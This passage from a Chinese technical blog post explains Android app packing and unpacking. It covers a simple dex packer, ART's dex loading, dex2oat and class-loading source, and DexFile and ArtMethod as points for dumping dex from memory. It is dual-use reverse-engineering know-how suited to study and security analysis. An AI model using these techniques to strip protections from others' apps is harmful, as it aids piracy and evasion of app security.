title=\"1.编写源程序\"></a>1.编写源程序</h3><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/26.png\" alt=\"image-20220612193114397\"></p>\n<p>这就是我们的源程序，源程序运行，我们会在日志中看见我们打印的信息，然后我们生成dex文件</p>\n<h3 id=\"2-编写壳程序\"><a href=\"#2-编写壳程序\" class=\"headerlink\" title=\"2.编写壳程序\"></a>2.编写壳程序</h3><h4 id=\"（1）准备工作\"><a href=\"#（1）准备工作\" class=\"headerlink\" title=\"（1）准备工作\"></a>（1）准备工作</h4><p>将dex文件上传sdcard，并给应用设置存储权限</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/27.png\" alt=\"image-20220612195812601\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/30.png\" alt=\"image-20220612200126917\"></p>\n<h4 id=\"（2）编写代理类\"><a href=\"#（2）编写代理类\" class=\"headerlink\" title=\"（2）编写代理类\"></a>（2）编写代理类</h4><p>我们首先编写代理类，模仿上面的加壳应用</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/28.png\" alt=\"image-20220612193735398\"></p>\n<p>然后我们设置AndroidManifest.xml中的代理类别</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/29.png\" alt=\"image-20220612193921062\"></p>\n<p>然后我们选择在attachBaseContext或onCreate中对我们的dex进行动态加载和类加载器修正即可，因为这里我们源dex并未进行加密，所以也无需解密的过程</p>\n<p>然后加入导入类的Activity</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/34.png\" alt=\"image-20220612215843088\"></p>\n<h4 id=\"（3）动态加载\"><a href=\"#（3）动态加载\" class=\"headerlink\" title=\"（3）动态加载\"></a>（3）动态加载</h4><p>我们进行动态加载classes.dex</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/31.png\" alt=\"image-20220612200319851\"></p>\n<p>然后使用上面的一种方法进行类加载器修正</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/32.png\" alt=\"image-20220612215713138\"></p>\n<p>然后运行</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/33.png\" alt=\"image-20220612215745595\"></p>\n<p>运行成功，说明我们的整体加壳成功</p>\n<h2 id=\"四、脱壳点相关概念详解\"><a href=\"#四、脱壳点相关概念详解\" class=\"headerlink\" title=\"四、脱壳点相关概念详解\"></a>四、脱壳点相关概念详解</h2><p>上面我们已经理解了APP加壳的基本原理，下面我们进一步来学习如何进行脱壳，Android APP脱壳绕不开<code>DexFile</code>、<code>ArtMethod</code>两个概念，这两个在脱壳中扮演的至关重要的地位，无数的脱壳点都是从其演变而来。</p>\n<h3 id=\"1-Dex加载流程\"><a href=\"#1-Dex加载流程\" class=\"headerlink\" title=\"1.Dex加载流程\"></a>1.Dex加载流程</h3><p>我们在分析脱壳点过程中，首先就需要明白Dex加载的基本流程</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/40.png\" alt=\"image-20220612215745595\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DexPathList:该类主要用来查找Dex、SO库的路径，并这些路径整体呈一个数组</span><br><span class=\"line\">Element:根据多路径的分隔符“;”将dexPath转换成File列表，记录所有的dexFile</span><br><span class=\"line\">DexFile:用来描述Dex文件，Dex的加载以及Class的查找都是由该类调用它的native方法完成的</span><br></pre></td></tr></table></figure>\n\n<p>我们依次来分析这个过程中的源码</p>\n<p><code>DexPathList</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/libcore/dalvik/src/main/java/dalvik/system/DexPathList.java</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">DexPathList</span><span class=\"params\">(ClassLoader definingContext, String dexPath,</span></span><br><span class=\"line\"><span class=\"params\">            String librarySearchPath, File optimizedDirectory)</span> &#123;</span><br><span class=\"line\">**********************      </span><br><span class=\"line\">   <span class=\"built_in\">this</span>.dexElements = makeDexElements(splitDexPath(dexPath), optimizedDirectory,</span><br><span class=\"line\">                                         suppressedExceptions, definingContext);    </span><br><span class=\"line\">**********************  </span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>makeDexElements</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Element[] makeDexElements(List&lt;File&gt; files, File optimizedDirectory,</span><br><span class=\"line\">          List&lt;IOException&gt; suppressedExceptions, ClassLoader loader) &#123;</span><br><span class=\"line\">**********************            </span><br><span class=\"line\">       <span class=\"type\">DexFile</span> <span class=\"variable\">dex</span> <span class=\"operator\">=</span> loadDexFile(file, optimizedDirectory, loader, elements);    </span><br><span class=\"line\">**********************         </span><br><span class=\"line\">          &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>loadDexFile</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> DexFile <span class=\"title function_\">loadDexFile</span><span class=\"params\">(File file, File optimizedDirectory, ClassLoader loader,</span></span><br><span class=\"line\"><span class=\"params\">                                       Element[] elements)</span></span><br><span class=\"line\">            <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (optimizedDirectory == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DexFile</span>(file, loader, elements);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"type\">String</span> <span class=\"variable\">optimizedPath</span> <span class=\"operator\">=</span> optimizedPathFor(file, optimizedDirectory);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> DexFile.loadDex(file.getPath(), optimizedPath, <span class=\"number\">0</span>, loader, elements);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>loadDex</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> DexFile <span class=\"title function_\">loadDex</span><span class=\"params\">(String sourcePathName, String outputPathName,</span></span><br><span class=\"line\"><span class=\"params\">      <span class=\"type\">int</span> flags, ClassLoader loader, DexPathList.Element[] elements)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">DexFile</span>(sourcePathName, outputPathName, flags, loader, elements);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>DexFile</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/libcore/dalvik/src/main/java/dalvik/system/DexFile.java</span><br><span class=\"line\">DexFile(String fileName, ClassLoader loader, DexPathList.Element[] elements) throws IOException &#123;</span><br><span class=\"line\">        mCookie = openDexFile(fileName, null, 0, loader, elements);</span><br><span class=\"line\">        mInternalCookie = mCookie;</span><br><span class=\"line\">        mFileName = fileName;</span><br><span class=\"line\">        //System.out.println(&quot;DEX FILE cookie is &quot; + mCookie + &quot; fileName=&quot; + fileName);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里出现的mCookie，mCookie在C&#x2F;C++层中是DexFile的指针，我们在下面详细讲解</p>\n<p><code>openDexFile</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">openDexFile</span><span class=\"params\">(String sourceName, String outputName, <span class=\"type\">int</span> flags,</span></span><br><span class=\"line\"><span class=\"params\">        ClassLoader loader, DexPathList.Element[] elements)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">       <span class=\"comment\">// Use absolute paths to enable the use of relative paths when testing on host.</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> openDexFileNative(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(sourceName).getAbsolutePath(),</span><br><span class=\"line\">                                 (outputName == <span class=\"literal\">null</span>)</span><br><span class=\"line\">                                    ? <span class=\"literal\">null</span></span><br><span class=\"line\">                                   : <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(outputName).getAbsolutePath(),</span><br><span class=\"line\">                               \t   flags,</span><br><span class=\"line\">                                   loader,</span><br><span class=\"line\">                                   elements);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里就进入了C&#x2F;C++层</p>\n<p><code>openDexFileNative</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/41.png\" alt=\"image-20220613134340460\"></p>\n<p>为了节约篇幅，我们快速分析，中间再经过一些函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">OpenDexFilesFromOat()</span><br><span class=\"line\">MakeUpToDate()</span><br><span class=\"line\">GenerateOatFileNoChecks()</span><br><span class=\"line\">Dex2Oat()</span><br></pre></td></tr></table></figure>\n\n<p>最后进进入了Dex2Oat，这就进入了Dex2Oat的编译流程</p>\n<p>反之如果我们在下面Dex2Oat的流程中通过Hook相关方法或execv或execve导致dex2oat失败，我们就会返回到<code>OpenDexFilesFromOat</code></p>\n<p><code>OpenDexFilesFromOat</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/44.png\" alt=\"image-20220613145156590\"></p>\n<p>会先在<code>HasOriginalDexFiles</code>里尝试加载我们的Dex，也就是说，倘若我们的壳阻断了dex2oat的编译流程，然后又调用了DexFile的Open函数。</p>\n<p><code>DexFile::Open</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/45.png\" alt=\"image-20220613145606897\"></p>\n<p>校验dex的魔术字字段，然后调用<code>DexFile::OpenFile</code></p>\n<p><code>DexFile::OpenFile</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/art/runtime/dex_file.cc</span><br><span class=\"line\">std::unique_ptr&lt;const DexFile&gt; DexFile::OpenFile(int fd,</span><br><span class=\"line\">                                                const std::string&amp; location,</span><br><span class=\"line\">                                                bool verify,</span><br><span class=\"line\">                                                bool verify_checksum,</span><br><span class=\"line\">                                                std::string* error_msg) &#123;</span><br><span class=\"line\"> **************************************</span><br><span class=\"line\"> std::unique_ptr&lt;DexFile&gt; dex_file = OpenCommon(map-&gt;Begin(),</span><br><span class=\"line\">                                                map-&gt;Size(),</span><br><span class=\"line\">                                                location,</span><br><span class=\"line\">                                                dex_header-&gt;checksum_,</span><br><span class=\"line\">                                                kNoOatDexFile,</span><br><span class=\"line\">                                                verify,</span><br><span class=\"line\">                                                verify_checksum,</span><br><span class=\"line\">                                                error_msg);   </span><br><span class=\"line\">  **************************************</span><br><span class=\"line\">                                                </span><br><span class=\"line\">                                                &#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>OpenCommon</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/46.png\" alt=\"image-20220613145950224\"></p>\n<p>最后又再次回到<code>DexFile</code>类，这里我们的dex文件加载基本流程分析完毕</p>\n<h3 id=\"2-Dex2Oat编译流程\"><a href=\"#2-Dex2Oat编译流程\" class=\"headerlink\" title=\"2.Dex2Oat编译流程\"></a>2.Dex2Oat编译流程</h3><p>Dex2oat是google公司为了提高编译效率的一种机制，从Android8.0开始实施，一些加壳厂商实现抽取壳往往会禁用Dex2oat，而针对整体加壳没有禁用的Dex2Oat也成为了脱壳点</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/42.png\" alt=\"image-20220613134904994\"></p>\n<p><code>Exec</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">/art/runtime/exec_utils.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">Exec</span><span class=\"params\">(std::vector&lt;std::string&gt;&amp; arg_vector, std::string* error_msg)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> status = <span class=\"built_in\">ExecAndReturnCode</span>(arg_vector, error_msg);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (status != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">const</span> std::string <span class=\"title\">command_line</span><span class=\"params\">(android::base::Join(arg_vector, <span class=\"string\">&#x27; &#x27;</span>))</span></span>;</span><br><span class=\"line\">    *error_msg = <span class=\"built_in\">StringPrintf</span>(<span class=\"string\">&quot;Failed execv(%s) because non-0 exit status&quot;</span>,</span><br><span class=\"line\">                              command_line.<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>ExecAndReturnCode</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/43.png\" alt=\"image-20220613143206138\"></p>\n<p>而我们就可以通过Hook execv或execve来禁用Dex2Oat，而如果我们不禁用dex2oat，<em>execve函数</em>是用来调用<code>dex2oat</code>的二进制程序实现对dex文件的加载，我们这时候找到<code>dex2oat.cc</code>这个文件，找到main函数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/art/dex2oat/dex2oat.cc</span><br><span class=\"line\"> <span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> static_cast&lt;<span class=\"type\">int</span>&gt;(art::Dex2oat(argc, argv));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!art::kIsDebugBuild &amp;&amp; (RUNNING_ON_MEMORY_TOOL == <span class=\"number\">0</span>)) &#123;</span><br><span class=\"line\">    _exit(result);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n\n<p>这里我们调用了Dex2oat</p>\n<p><code>Dex2Oat</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/art/dex2oat/dex2oat.cc</span><br><span class=\"line\"><span class=\"keyword\">static</span> dex2oat::ReturnCode <span class=\"title function_\">Dex2oat</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>** argv)</span> &#123;</span><br><span class=\"line\">   **************************************</span><br><span class=\"line\">   dex2oat::<span class=\"type\">ReturnCode</span> <span class=\"variable\">setup_code</span> <span class=\"operator\">=</span> dex2oat-&gt;Setup();</span><br><span class=\"line\">    dex2oat::ReturnCode result;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (dex2oat-&gt;IsImage()) &#123;</span><br><span class=\"line\">    result = CompileImage(*dex2oat);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    result = CompileApp(*dex2oat);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">   **************************************</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Dex2oat中会对dex文件进行逐个类逐个函数的编译，setup()函数完成对dex的加载</p>\n<p>然后顺序执行，就会进入<code>CompileApp</code></p>\n<p>编译过程中会按照逐个函数进行编译，就会进入<code>CompileMethod</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/47.png\" alt=\"image-20220613151229524\"></p>\n<p>到这里Dex2oat的基本流程就分析完毕</p>\n<h3 id=\"3-类加载流程\"><a href=\"#3-类加载流程\" class=\"headerlink\" title=\"3.类加载流程\"></a>3.类加载流程</h3><p>要理解DexFile为什么如此重要，首先我们要清除Android APP的类加载流程。Android的类加载一般分为两类<code>隐式加载</code>和<code>显式加载</code></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>隐式加载:</span><br><span class=\"line\">    (<span class=\"number\">1</span>)创建类的实例,也就是<span class=\"keyword\">new</span>一个对象</span><br><span class=\"line\">    (<span class=\"number\">2</span>)访问某个类或接口的静态变量,或者对该静态变量赋值</span><br><span class=\"line\">    (<span class=\"number\">3</span>)调用类的静态方法</span><br><span class=\"line\">    (<span class=\"number\">4</span>)反射Class.forName(<span class=\"string\">&quot;android.app.ActivityThread&quot;</span>)</span><br><span class=\"line\">    (<span class=\"number\">5</span>)初始化一个类的子类(会首先初始化子类的父类)</span><br><span class=\"line\"><span class=\"number\">2.</span>显示加载：</span><br><span class=\"line\">    (<span class=\"number\">1</span>)使用LoadClass()加载</span><br><span class=\"line\">    (<span class=\"number\">2</span>)使用forName()加载</span><br></pre></td></tr></table></figure>\n\n<p>我们详细看一下显示加载：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Class.forName 和 ClassLoader.loadClass加载有何不同：</span><br><span class=\"line\">（<span class=\"number\">1</span>）ClassLoader.loadClass也能加载一个类,但是不会触发类的初始化(也就是说不会对类的静态变量,静态代码块进行初始化操作)</span><br><span class=\"line\">（<span class=\"number\">2</span>）Class.forName这种方式,不但会加载一个类,还会触发类的初始化阶段,也能够为这个类的静态变量,静态代码块进行初始化操作</span><br></pre></td></tr></table></figure>\n\n<p>我们在详细来看一下在类加载过程中的流程：</p>\n<p><code>java层</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/35.png\" alt=\"image-20220612215745595\"></p>\n<p>我们可以发现类加载中关键的DexFile，该类用来描述Dex文件，所以我们的脱壳对象就是<code>DexFile</code></p>\n<p>这里从DexFile进入Native层中，还有一个关键的字段就是<code>mCookie</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/36.png\" alt=\"image-20220613102141423\"></p>\n<p>后面我们详细的介绍<code>mCookie</code>的作用</p>\n<p>我们进一步分析，进入Native层</p>\n<p><code>Native层</code></p>\n<p>&#x2F;art&#x2F;runtime&#x2F;native&#x2F;[dalvik_system_DexFile.cc</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/37.png\" alt=\"image-20220613124716608\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ConvertJavaArrayToDexFiles对cookie进行了处理</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/38.png\" alt=\"image-20220613125016884\"></p>\n<p>通过这里的分析，我们可以知道mCooike转换为C&#x2F;C++层指针后，就是dexfile的索引</p>\n<p>我们继续分析<code>DefineClass</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/class_linker.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\">mirror::Class* <span class=\"title\">ClassLinker::DefineClass</span><span class=\"params\">(Thread* self,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                      <span class=\"type\">const</span> <span class=\"type\">char</span>* descriptor,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                        <span class=\"type\">size_t</span> hash,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                       Handle&lt;mirror::ClassLoader&gt; class_loader,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                        <span class=\"type\">const</span> DexFile&amp; dex_file,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                        <span class=\"type\">const</span> DexFile::ClassDef&amp; dex_class_def)</span> </span>&#123;</span><br><span class=\"line\">***************</span><br><span class=\"line\"><span class=\"built_in\">LoadClass</span>(self, *new_dex_file, *new_class_def, klass);</span><br><span class=\"line\">***************</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>LoadClass</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/class_linker.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ClassLinker::LoadClass</span><span class=\"params\">(Thread* self,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"><span class=\"number\">3120</span>                            <span class=\"type\">const</span> DexFile&amp; dex_file,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"><span class=\"number\">3121</span>                            <span class=\"type\">const</span> DexFile::ClassDef&amp; dex_class_def,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\"><span class=\"number\">3122</span>                            Handle&lt;mirror::Class&gt; klass)</span> </span>&#123;</span><br><span class=\"line\"><span class=\"number\">3123</span>  <span class=\"type\">const</span> <span class=\"type\">uint8_t</span>* class_data = dex_file.<span class=\"built_in\">GetClassData</span>(dex_class_def);</span><br><span class=\"line\"><span class=\"number\">3124</span>  <span class=\"keyword\">if</span> (class_data == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\"><span class=\"number\">3125</span>    <span class=\"keyword\">return</span>;  <span class=\"comment\">// no fields or methods - for example a marker interface</span></span><br><span class=\"line\"><span class=\"number\">3126</span>  &#125;</span><br><span class=\"line\"><span class=\"number\">3127</span>  <span class=\"built_in\">LoadClassMembers</span>(self, dex_file, class_data, klass);</span><br><span class=\"line\"><span class=\"number\">3128</span>&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>LoadClassMembers</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/class_linker.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ClassLinker::LoadClassMembers</span><span class=\"params\">(Thread* self,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                   <span class=\"type\">const</span> DexFile&amp; dex_file,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                   <span class=\"type\">const</span> <span class=\"type\">uint8_t</span>* class_data,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                                   Handle&lt;mirror::Class&gt; klass)</span> </span>&#123;</span><br><span class=\"line\">***************</span><br><span class=\"line\">      <span class=\"built_in\">LoadMethod</span>(dex_file, it, klass, method);</span><br><span class=\"line\">      <span class=\"built_in\">LinkCode</span>(<span class=\"keyword\">this</span>, method, oat_class_ptr, class_def_method_index);</span><br><span class=\"line\">***************</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>LoadMethod</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/class_linker.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">ClassLinker::LoadMethod</span><span class=\"params\">(<span class=\"type\">const</span> DexFile&amp; dex_file,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                           <span class=\"type\">const</span> ClassDataItemIterator&amp; it,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                            Handle&lt;mirror::Class&gt; klass,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                             ArtMethod* dst)</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>LinkCode</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/39.png\" alt=\"image-20220613130149629\"></p>\n<p>我们可以发现这里就进入了从linkcode后就进入了解释器中，并对是否进行dex2oat进行了判断，我们直接进入解释器中继续分析</p>\n<p>我们知道Art解释器分为两种：<code>解释模式下</code>和<code>quick模式下</code>，而我们又知道Android8.0开始进行dex2oat</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">如果壳没有禁用dex2oat，那类中的初始化函数运行在解释器模式下 </span><br><span class=\"line\">如果壳禁用dex2oat，dex文件中的所有函数都运行在解释器模式下</span><br><span class=\"line\">则类的初始化函数运行在解释器模式下</span><br></pre></td></tr></table></figure>\n\n<p>所以一般的加壳厂商会禁用掉dex2oat，这样可以是所有的函数都运行在解释模式下，所以一些脱壳点选在dex2oat流程中，可能针对禁用dex2oat的情况并不使用，我们这里主要针对整体加壳，就不展开讲述，最后我们得知解释器中会运行在<code>Execute</code>下</p>\n<p><code>Execute</code></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">art/runtime/interpreter/interpreter.<span class=\"function\">cc</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> JValue <span class=\"title\">Execute</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    Thread* self,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"type\">const</span> DexFile::CodeItem* code_item,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    ShadowFrame&amp; shadow_frame,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    JValue result_register,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"type\">bool</span> stay_in_interpreter = <span class=\"literal\">false</span>)</span> <span class=\"title\">REQUIRES_SHARED</span><span class=\"params\">(Locks::mutator_lock_)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">***************</span><br><span class=\"line\">      ArtMethod *method = shadow_frame.<span class=\"built_in\">GetMethod</span>();</span><br><span class=\"line\">***************</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里我们大致分析完成了类加载的思路</p>\n<h3 id=\"4-DexFile详解\"><a href=\"#4-DexFile详解\" class=\"headerlink\" title=\"4.DexFile详解\"></a>4.DexFile详解</h3><p>前面我们分析了很多，对dex加载、类加载等都已经有了一个很详细的了解，而最终一切的核心就是DexFile，DexFile就是我们脱壳所关注的重点，寒冰大佬在<a href=\"https://bbs.pediy.com/thread-254555.htm#msg_header_h2_2\">拨云见日：安卓APP脱壳的本质以及如何快速发现ART下的脱壳点</a>中提到，在ART下只要获得了DexFile对象，那么我们就可以得到该dex文件在内存中的起始地址和大小，进而完成脱壳。</p>\n<p>我们先查看一些DexFile的结构体</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/48.png\" alt=\"image-20220613152305983\"></p>\n<p>只要我们能获得起始地址begin和大小size，就可以成功的将dex文件脱取下来，这里我们记得DexFile含有虚函数表，所以根据C++布局，要偏移一个指针</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/49.png\" alt=\"image-20220613152517629\"></p>\n<p>而DexFile类还给我们提供了方便的API</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/50.png\" alt=\"image-20220613152724888\"></p>\n<p>这样只要我们找到函数中有DexFile对象，就可以通过调用API来进一步dump dex文件，由此按照寒冰大佬的思想，大量的脱壳点由此产生</p>\n<h4 id=\"（1）直接查找法\"><a href=\"#（1）直接查找法\" class=\"headerlink\" title=\"（1）直接查找法\"></a>（1）直接查找法</h4><p>我们通过直接在Android源码中搜索DexFile，就可以获得海量的脱壳点</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/51.png\" alt=\"image-20220613153036103\"></p>\n<p>我们通过在IDA中搜索libart.so导出的DexFile，同样可以获得大量的脱壳点</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/52.png\" alt=\"image-20220613153220786\"></p>\n<h4 id=\"（2）间接查找法\"><a href=\"#（2）间接查找法\" class=\"headerlink\" title=\"（2）间接查找法\"></a>（2）间接查找法</h4><p>这里就是寒冰大佬在文章中提到的通过ArtMethod对象的getDexFile()获取到ArtMethod所属的DexFile对象的这种一级间接法，通过Thread的getCurrentMethod()函数首先获取到ArtMethod或者通过ShadowFrame的getMethod获取到ArtMethod对象，然后再通过getDexFile获取到ArtMethod对象所属的DexFile的二级间接法。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">getDexFile()</span><br><span class=\"line\">getMethod()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-ArtMethod详解\"><a href=\"#5-ArtMethod详解\" class=\"headerlink\" title=\"5.ArtMethod详解\"></a>5.ArtMethod详解</h3><p>上面我们已经详细分析了DexFile的文件结构，我们知道通过ArtMethod可以获得DexFile，那么为啥又要单独提ArtMethod呢，因为ArtMethod在抽取壳和VMP等壳中扮演了重要的角色</p>\n<p>ArtMethod结构体</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/53.png\" alt=\"image-20220613154044296\"></p>\n<p>我们通过ArtMethod可以获得codeitem的偏移和方法索引，熟悉dex结构的朋友知道codeitem就是代码实际的值，而codeitem则再后续加壳技术扮演了至关重要的地址，而且ArtMethod还有非常丰富的方法，可以帮助大家实现很多功能，所以在脱壳工作中也是十分重要的</p>\n<h2 id=\"五、脱壳技术归纳\"><a href=\"#五、脱壳技术归纳\" class=\"headerlink\" 